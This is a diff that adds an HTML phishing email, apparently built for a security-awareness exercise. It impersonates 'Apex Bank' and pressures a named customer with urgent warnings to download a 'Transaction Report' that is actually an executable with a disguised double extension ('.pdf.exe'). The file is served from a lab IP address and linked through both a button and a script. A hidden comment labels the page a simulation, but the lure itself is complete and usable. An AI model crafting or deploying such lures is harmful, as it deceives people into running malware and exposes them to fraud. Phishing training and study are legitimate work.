@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8">
+	<title>Important: Apex Bank Transaction Report</title>
+	<style type="text/css">body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333333;
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .email-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #0056b3;
+        }
+        .header {
+            border-bottom: 1px solid #eeeeee;
+            padding-bottom: 20px;
+            margin-bottom: 25px;
+        }
+        .logo {
+            color: #0056b3;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .subtitle {
+            color: #666666;
+            font-size: 14px;
+        }
+        .alert-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-left: 4px solid #f39c12;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .download-section {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            padding: 20px;
+            border-radius: 6px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        .download-button {
+            display: inline-block;
+            background-color: #28a745;
+            color: white;
+            padding: 14px 32px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        .download-button:hover {
+            background-color: #218838;
+        }
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eeeeee;
+            font-size: 12px;
+            color: #777777;
+            text-align: center;
+        }
+        .warning {
+            color: #dc3545;
+            font-size: 12px;
+            font-style: italic;
+        }
+        .hidden-note {
+            display: none;
+        }
+	</style>
+	<script>
+    function startDownload() {
+        // Mark download attempt (for UX or logging)
+        sessionStorage.setItem('downloaded', 'true');
+
+        // Redirect user to the file (browser handles warnings)
+        window.location.href =
+            'http://192.168.174.128:8080/Transaction-Report.pdf.exe';
+    }
+</script>
+</head>
+<body>
+<div class="email-container"><!-- Educational Disclaimer (hidden but in source) -->
+<div class="hidden-note"><!-- SECURITY AWARENESS TEST - This is a simulated phishing page for educational purposes only --><!-- Do not enter real credentials. This page is part of a controlled security training exercise. --></div>
+
+<div class="header">
+<div class="logo">APEX BANK</div>
+
+<div class="subtitle">Secure Banking - Financial Excellence</div>
+</div>
+
+<div class="alert-box"><strong>Action Required:</strong> Please review your recent transaction activity.
+
+<div class="warning" style="margin-top: 5px;">Document expires in 24 hours. Immediate review recommended.</div>
+</div>
+
+<p>Dear Bob Smith,</p>
+
+<p>As part of our routine account monitoring, Apex Bank has generated your <strong>Yearly Transaction Report</strong> covering the period from January 1, 2025 to January 1, 2026.</p>
+
+<p>The report includes:</p>
+
+<ul>
+	<li>Recent transaction activity (last 90 days)</li>
+	<li>Account balance verification and trends</li>
+	<li>Suspicious activity flags requiring review</li>
+	<li>Compliance documentation for audit purposes</li>
+</ul>
+
+<div class="download-section">
+<h3>Secure Document Download</h3>
+
+<p>Your encrypted transaction report is ready for download:</p>
+<!-- Main download button --><a class="download-button" href="http://192.168.174.128:8080/Transaction-Report.pdf.exe" onclick="sessionStorage.setItem('downloaded', 'true');">Download Transaction Report </a>
+
+<p style="margin-top:15px; font-size:14px; color: #666;"><strong>File Details:</strong><br />
+<span style="font-family: monospace;">ApexBank_Transaction_Report_Q4_2025</span><br />
+Size: 1.8 KB</p>
+
+<div style="background-color: #e8f4fd; padding: 10px; border-radius: 4px; margin-top: 15px;"><small><strong>Security Notice:</strong> This document contains sensitive information. Ensure you are on a secure network before downloading.</small></div>
+</div>
+
+<div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin: 20px 0;">
+<h4 style="margin-top: 0;">Document Verification</h4>
+
+<p style="margin-bottom: 5px;"><strong>Report ID:</strong> #AB-TX-2024-Q4-7842</p>
+
+<p style="margin-bottom: 5px;"><strong>Generated:</strong> January 1, 2026 14:30 UTC</p>
+
+<p style="margin-bottom: 5px;"><strong>Authorized by:</strong> Apex Bank Compliance Department</p>
+</div>
+
+<p>If you do not recognize any transactions listed in this report, please contact our <strong>24/7 Fraud Detection Team</strong> immediately at 1-800-APEX-BANK to avoid potential account restrictions.</p>
+
+<p>For your security, this report will be automatically deleted from our secure servers in 7 days.</p>
+
+<p>Sincerely,<br />
+<strong>Frank Abagnale</strong><br />
+Senior Compliance Officer<br />
+Client Security Team<br />
+Apex National Bank<br />
+<small style="color: #666;">FDIC #32847 &bull; SWIFT: APEXUS33</small></p>
+
+<div class="footer">
+<p>This message was sent from a secure, no-reply address.<br />
+Apex Bank &bull; 123 Financial District, New York, NY 10005<br />
+Member FDIC &bull; Equal Housing Lender</p>
+
+<p style="font-size: 11px; color: #999; margin-top: 10px;">CONFIDENTIAL: This email and any attachments are confidential and may be privileged. If you are not the intended recipient, please delete all copies and notify us immediately.</p>
+</div>
+</div>
+<!-- Additional JavaScript for better UX --><script>
+    // Track download attempts
+    document.addEventListener('DOMContentLoaded', function() {
+        var downloadLinks = document.querySelectorAll('a[href*="download"]');
+        downloadLinks.forEach(function(link) {
+            link.addEventListener('click', function() {
+                // You could log this to your server in a real educational setup
+                console.log('Download initiated: ' + new Date().toISOString());
+            });
+        });
+    });
+</script>
+
+<p>&nbsp;</p>
+</body>
+</html>
